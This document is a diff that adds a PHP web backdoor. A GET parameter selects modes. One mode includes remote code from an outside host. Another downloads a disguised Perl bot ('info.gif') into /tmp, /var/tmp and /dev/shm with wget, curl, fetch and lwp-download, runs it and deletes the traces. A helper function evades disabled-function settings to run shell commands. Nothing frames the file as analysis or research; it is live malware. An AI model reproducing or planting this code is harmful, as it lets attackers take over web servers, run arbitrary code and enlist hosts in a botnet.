@@ -1,0 +1,71 @@
+<?php
+$modez = $_GET["modez"];
+$site = 'http://e-civ.net/other/img/';
+$file = 'info.gif';
+$bot  = "$site$file";
+$pbot = 'http://ovhj.nl/tmp/read.jpg';
+$del  = $file.'*';
+$tdir = '/tmp';
+$vdir = '/var/tmp/';
+$xdir = '/dev/shm/';
+$arg  = '';
+switch ($modez) {
+case "botz":
+include($pbot);
+break;
+case "shellz":
+echo "Fake Modez!";
+#$cdir = @getcwd();
+#$html = implode('', @file($sh_src));
+#$f    = ($cdir.DIRECTORY_SEPARATOR.$sh_file);
+#$r    = @fopen($f,'w');
+#if (@fwrite($r,$html)) { echo "Writed to $f!"; }
+#else { die("Error writing $f!"); }
+#fclose($r);
+break;
+case "scannerz":
+echo fx29exec('cd '.$tdir.';rm -rf '.$del);
+echo fx29exec('cd '.$tdir.';wget '.$bot);
+echo fx29exec('cd '.$tdir.';fetch '.$bot);
+echo fx29exec('cd '.$tdir.';lwp-download '.$bot);
+echo fx29exec('cd '.$tdir.';curl -O '.$bot);
+echo fx29exec('cd '.$tdir.';perl '.$file.' '.$arg);
+echo fx29exec('cd '.$tdir.';rm -rf '.$del);
+echo fx29exec('cd '.$tdir.';del '.$del);
+echo fx29exec('cd '.$vdir.';rm -rf '.$del);
+echo fx29exec('cd '.$vdir.';wget '.$bot);
+echo fx29exec('cd '.$vdir.';fetch '.$bot);
+echo fx29exec('cd '.$vdir.';lwp-download '.$bot);
+echo fx29exec('cd '.$vdir.';curl -O '.$bot);
+echo fx29exec('cd '.$vdir.';perl '.$file.' '.$arg);
+echo fx29exec('cd '.$vdir.';rm -rf '.$del);
+echo fx29exec('cd '.$vdir.';del '.$del);
+echo fx29exec('cd '.$xdir.';rm -rf '.$del);
+echo fx29exec('cd '.$xdir.';wget '.$bot);
+echo fx29exec('cd '.$xdir.';fetch '.$bot);
+echo fx29exec('cd '.$xdir.';lwp-download '.$bot);
+echo fx29exec('cd '.$xdir.';curl -O '.$bot);
+echo fx29exec('cd '.$xdir.';perl '.$file.' '.$arg);
+echo fx29exec('cd '.$xdir.';rm -rf '.$del);
+echo fx29exec('cd '.$xdir.';del '.$del);
+break;
+case "psybnc":
+echo "Fake Modez!";
+break;
+default:
+echo "Unknown Modez!";
+break;
+}
+function getdisfunc() { $rez = explode(",",@ini_get("disable_functions")); return (!empty($rez))?$rez:array(); }
+function enabled($func) { return (function_exists($func) && is_callable($func) && !in_array($func,getdisfunc())) ? TRUE : FALSE; }
+function fx29exec($cmd) {
+$rez = "";
+if (enabled("popen")) { if ( is_resource($h = popen($cmd.' 2>&1', 'r')) ) { while ( !feof($h) ) { @$rez .= fread($h, 2096);  } pclose($h); } }
+elseif (enabled("passthru")) { @ob_start(); passthru($cmd); $rez = @ob_get_contents(); @ob_end_clean(); }
+elseif (enabled("system")) { @ob_start(); system($cmd); $rez = @ob_get_contents(); @ob_end_clean(); }
+elseif (enabled("exec")) { exec($cmd,$o); $rez = join("\r\n",$o); }
+elseif (enabled("shell_exec")) { $rez = shell_exec($cmd); }
+return $rez;
+}
+?>
+<?php die(); ?>
